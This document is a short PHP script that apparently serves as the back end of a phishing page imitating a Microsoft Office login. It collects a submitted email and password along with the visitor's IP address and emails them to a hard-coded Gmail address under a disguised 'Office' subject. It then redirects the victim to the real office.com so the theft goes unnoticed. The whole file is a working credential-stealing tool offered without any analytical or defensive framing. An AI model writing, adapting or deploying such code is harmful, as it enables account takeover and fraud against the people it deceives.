<?php
if($_POST["userid"] != "" and $_POST["pass"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "\n";
$message .= "Email: ".$_POST['userid']."\n";
$message .= "pass: ".$_POST['pass']."\n";
$message .= "\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "\n";
$message .= "\n";
$message .= "\n";
$send = "nathancoleman479@gmail.com";
$subject = " Oflfic//e | $ip";
{
mail("$send", "$subject", $message);   
}
  header ("Location: https://www.office.com");
}

?>